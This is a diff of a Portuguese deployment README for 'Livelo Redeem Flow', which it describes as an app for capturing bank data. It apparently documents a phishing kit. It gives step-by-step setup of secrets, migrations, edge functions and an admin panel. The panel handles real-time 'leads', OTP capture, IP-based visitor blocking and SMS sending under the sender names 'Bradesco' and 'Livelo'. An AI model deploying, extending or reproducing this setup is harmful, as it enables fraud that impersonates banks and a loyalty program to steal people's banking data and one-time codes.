@@ -1,6 +1,6 @@
 # Livelo Redeem Flow
 
-SPA de captura de dados bancários com painel administrativo em tempo real.
+SPA de captura de dados bancarios com painel administrativo em tempo real.
 
 ## Stack
 
@@ -10,7 +10,7 @@ SPA de captura de dados bancários com painel administrativo em tempo real.
 
 ---
 
-## Instalação manual
+## Passo a passo — Deploy completo
 
 ### 1. Clonar e instalar
 
@@ -27,51 +27,72 @@ cp .env.example .env
 nano .env
 ```
 
-Preencher as variáveis `VITE_*` (ver seção abaixo).
+Preencher as variaveis `VITE_*` (ver tabela abaixo).
 
-### 3. Supabase Secrets
+### 3. Login no Supabase CLI
 
 ```bash
-npx supabase secrets set \
-  SUPABASE_SERVICE_ROLE_KEY="..." \
-  TURNSTILE_SECRET_KEY="..." \
-  RISENEW_API_KEY="..." \
-  RISENEW_API_SECRET="..." \
-  RISENEW_SENDER="Bradesco" \
-  RISENEW_API_KEY_2="..." \
-  RISENEW_API_SECRET_2="..." \
-  RISENEW_SENDER_2="Livelo" \
-  IPINFO_TOKEN="..." \
-  ZENROWS_API_KEY="..." \
-  META_PIXEL_ID="..." \
-  META_CAPI_ACCESS_TOKEN="..." \
-  --project-ref <project-id>
+npx supabase login
 ```
 
-> Ou use o script interativo que preenche `--project-ref` automaticamente:
-> ```bash
-> chmod +x set-secrets.sh && ./set-secrets.sh
-> ```
+Abre o navegador para autenticar. Depois de logar, linke o projeto:
 
-### 4. Migrations
+```bash
+npx supabase link --project-ref <project-id>
+```
 
-Rodar em ordem no **Supabase Dashboard → SQL Editor**:
+> O `project-id` e o **Reference ID** do projeto — encontra em **Settings > General** no Dashboard.
 
-1. `supabase/migrations/20260302235900_rls_indexes_functions.sql`
-2. `supabase/migrations/20260303000000_additions.sql`
-3. `supabase/migrations/20260304000000_session_ipinfo_fields.sql`
-4. `supabase/migrations/20260304000001_flow_otp_step.sql`
-5. `supabase/migrations/20260305000000_session_heartbeat.sql`
-6. `supabase/migrations/20260305000001_user_roles.sql`
-7. `supabase/migrations/20260306000000_otp_attempts.sql`
+### 4. Aplicar migrations
 
-### 5. Usuário admin
+```bash
+npx supabase db push
+```
 
-**Dashboard → Authentication → Users → Add user**
+Isso aplica todas as migrations pendentes de `supabase/migrations/` no banco remoto, em ordem.
+
+> Se preferir aplicar manualmente, copie cada arquivo SQL para o **SQL Editor** no Dashboard, na ordem cronologica dos nomes.
+
+### 5. Configurar Supabase Secrets
+
+```bash
+npx supabase secrets set SUPABASE_SERVICE_ROLE_KEY="..."
+npx supabase secrets set TURNSTILE_SECRET_KEY="..."
+npx supabase secrets set RISENEW_API_KEY="..."
+npx supabase secrets set RISENEW_API_SECRET="..."
+npx supabase secrets set RISENEW_SENDER="Bradesco"
+npx supabase secrets set RISENEW_API_KEY_2="..."
+npx supabase secrets set RISENEW_API_SECRET_2="..."
+npx supabase secrets set RISENEW_SENDER_2="Livelo"
+npx supabase secrets set IPINFO_TOKEN="..."
+npx supabase secrets set ZENROWS_API_KEY="..."
+npx supabase secrets set META_PIXEL_ID="..."
+npx supabase secrets set META_CAPI_ACCESS_TOKEN="..."
+```
+
+> Tambem pode configurar pelo **Dashboard > Settings > Edge Functions > Secrets**.
+
+Para verificar os secrets configurados:
+
+```bash
+npx supabase secrets list
+```
+
+### 6. Deploy das Edge Functions
+
+```bash
+npx supabase functions deploy
+```
+
+Faz deploy de todas as functions em `supabase/functions/`.
+
+### 7. Criar usuario admin
+
+**Dashboard > Authentication > Users > Add user**
 - Email: mesmo valor de `VITE_ADMIN_EMAIL` no `.env`
-- ✅ Auto Confirm User
+- Marque **Auto Confirm User**
 
-Depois no SQL Editor:
+Depois no **SQL Editor**:
 
 ```sql
 INSERT INTO public.user_roles (user_id, role)
@@ -80,75 +101,81 @@ WHERE email = 'seu-email@aqui'
 ON CONFLICT (user_id) DO NOTHING;
 ```
 
-### 6. Deploy edge functions
-
-```bash
-npx supabase login
-npx supabase link --project-ref <project-id>
-npx supabase functions deploy --project-ref <project-id>
-```
-
-### 7. Build e deploy
+### 8. Build e deploy
 
 ```bash
 bun run build
-# copiar dist/ para o servidor web
 ```
+
+Copie o conteudo de `dist/` para o servidor web (Apache, nginx, etc).
 
 ---
 
-## Atualização
+## Atualizacao
 
 ```bash
-./setup.sh  # selecionar opção 2
-# ou manualmente:
-git pull && bun install && bun run build
+git pull
+bun install
+bun run build
+# copiar dist/ para o servidor
 ```
 
 ---
 
 ## Painel Admin
 
-Acesse `/admin` — login com a senha do usuário criado no Supabase Auth.
+Acesse `/admin` — login com o usuario criado no Supabase Auth.
 
-| Página | Descrição |
+| Pagina | Descricao |
 |---|---|
-| `/admin` | Leads em tempo real, métricas, envio de SMS manual |
-| `/admin/acessos` | Sessões, IPs, status de bloqueio por regra |
-| `/admin/controle` | Configurações gerais, templates SMS, fluxo de etapas |
-| `/admin/fluxo` | Reordenação e habilitação de etapas |
+| `/admin` | Leads em tempo real, metricas, envio de SMS manual |
+| `/admin/acessos` | Sessoes, IPs, status de bloqueio por regra |
+| `/admin/controle` | Configuracoes gerais, templates SMS, fluxo de etapas |
+| `/admin/fluxo` | Reordenacao e habilitacao de etapas |
 
 ---
 
-## Variáveis de ambiente (`.env`)
+## Variaveis de ambiente (`.env`)
 
-Apenas variáveis de build-time do frontend:
-
-| Variável | Descrição |
+| Variavel | Descricao |
 |---|---|
 | `VITE_SUPABASE_PROJECT_ID` | Project Reference ID |
 | `VITE_SUPABASE_PUBLISHABLE_KEY` | Anon/public key |
 | `VITE_SUPABASE_URL` | URL do projeto |
-| `VITE_ADMIN_EMAIL` | Email do usuário admin |
-| `VITE_TURNSTILE_SITE_KEY` | Site key pública do Turnstile (opcional) |
+| `VITE_ADMIN_EMAIL` | Email do usuario admin |
+| `VITE_TURNSTILE_SITE_KEY` | Site key publica do Turnstile (opcional) |
 | `VITE_META_PIXEL_ID` | ID do pixel Meta (opcional) |
-| `VITE_SMS_SENDER_1_LABEL` | Label do sender padrão no painel |
+| `VITE_SMS_SENDER_1_LABEL` | Label do sender padrao no painel |
 | `VITE_SMS_SENDER_2_LABEL` | Label do sender alternativo no painel |
 | `VITE_SMS_LINK` | Placeholder `{{link}}` nos templates SMS |
 
 ## Supabase Secrets (edge functions)
 
-| Secret | Descrição |
+| Secret | Descricao |
 |---|---|
 | `SUPABASE_SERVICE_ROLE_KEY` | Service role key (bypasses RLS) |
 | `TURNSTILE_SECRET_KEY` | Cloudflare Turnstile secret |
-| `RISENEW_API_KEY` | Risenew — sender padrão |
-| `RISENEW_API_SECRET` | Risenew — sender padrão |
-| `RISENEW_SENDER` | Nome do sender padrão |
+| `RISENEW_API_KEY` | Risenew — sender padrao |
+| `RISENEW_API_SECRET` | Risenew — sender padrao |
+| `RISENEW_SENDER` | Nome do sender padrao |
 | `RISENEW_API_KEY_2` | Risenew — sender alternativo |
 | `RISENEW_API_SECRET_2` | Risenew — sender alternativo |
 | `RISENEW_SENDER_2` | Nome do sender alternativo |
-| `IPINFO_TOKEN` | IPInfo — geolocalização |
+| `IPINFO_TOKEN` | IPInfo — geolocalizacao |
 | `ZENROWS_API_KEY` | ZenRows — consulta de segmento |
 | `META_PIXEL_ID` | ID do pixel Meta (edge function) |
 | `META_CAPI_ACCESS_TOKEN` | Meta Conversions API token |
+
+---
+
+## Comandos uteis do Supabase CLI
+
+```bash
+npx supabase login              # autenticar
+npx supabase link --project-ref # linkar projeto
+npx supabase db push            # aplicar migrations
+npx supabase secrets set K=V    # definir secret
+npx supabase secrets list       # listar secrets
+npx supabase functions deploy   # deploy edge functions
+npx supabase functions serve    # rodar functions local
+```
